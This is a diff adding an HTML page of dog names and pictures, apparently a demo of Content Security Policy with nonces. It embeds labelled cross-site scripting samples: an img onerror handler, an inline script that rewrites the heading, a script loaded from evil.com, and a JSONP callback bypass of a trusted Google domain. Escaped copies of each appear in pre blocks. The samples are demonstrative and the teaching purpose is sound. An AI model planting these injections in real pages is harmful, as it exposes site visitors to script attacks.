@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <link rel="stylesheet" href="/styles.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Raleway:wght@700&family=Source+Sans+Pro:ital,wght@0,400;0,600;0,700;0,900;1,400;1,600;1,700;1,900&display=swap"
+    rel="stylesheet">
+</head>
+
+<body>
+  <h1>A list of the best dogs! 🐶</h1>
+  <ol>
+    <li>Max
+      <img src="https://place-puppy.com/300x300">
+
+    </li>
+    <li>Charlie
+      <img src="https://place-puppy.com/400x400">
+      <!-- Injected inline code -->
+      <img src="x" onerror="console.log('Malicious inline code executing ...')">
+    </li>
+    <pre>
+  &lt;img src&equals;&quot;cat&period;png&quot; onerror&equals;&quot;console&period;log&lpar;&apos;Malicious inline code executing &period;&period;&period;&apos;&rpar;&quot; &gt;
+</pre>
+
+    <li>Bella
+      <img src="https://place-puppy.com/500x500">
+      <!-- Injected script block -->
+      <script>
+        setTimeout(() => {
+          document.querySelector('h1').textContent = 'Cats are better'
+          console.log("Malicious script block executing ...");
+        }, 3000);
+      </script>
+    </li>
+    <pre>
+&lt;script&gt;&NewLine;  setTimeout&lpar;&lpar;&rpar; &equals;&gt; &lcub;&NewLine;    document&period;querySelector&lpar;&apos;h1&apos;&rpar;&period;textContent &equals; &apos;Cats are better&apos;&NewLine;    console&period;log&lpar;&quot;Malicious script block executing &period;&period;&period;&quot;&rpar;&semi;&NewLine;  &rcub;&comma; 3000&rpar;&semi;&NewLine;&lt;&sol;script&gt;
+</pre>
+    <li>Cooper
+      <img src="https://place-puppy.com/600x600">
+      <!-- Injected remote code file -->
+      <script src="https://evil.com/evil.js"></script>
+    </li>
+    <pre>
+&lt;script src&equals;&quot;https&colon;&sol;&sol;evil&period;com&sol;evil&period;js&quot;&gt;&lt;&sol;script&gt;
+    </pre>
+    <li>Daisy
+      <img src="https://place-puppy.com/700x700">
+
+      <!-- Trusted whitelist domain with JSONP endpoint -->
+      <script src="https://www.google.com/complete/search?client=chrome&q=concur&callback=alert"></script>
+    </li>
+    <pre>
+&lt;script src&equals;&quot;https&colon;&sol;&sol;www&period;google&period;com&sol;complete&sol;search&quest;client&equals;chrome&amp;q&equals;concur&amp;callback&equals;alert&quot;&gt;&lt;&sol;script&gt;
+    </pre>
+  </ol>
+  <button id="counter">Count the how many good boys are there!</button>
+
+  <!-- scripts -->
+  <script src="/js/script.js" nonce="<%= nonce %>"></script>
+  <script nonce="<%= nonce %>">
+    const numberOfDogs = document.querySelectorAll('li').length;
+    document.getElementById("counter")
+      .addEventListener("click", () => alert(`There are ${numberOfDogs} dogs in the list.`));
+  </script>
+</body>
+
+</html>
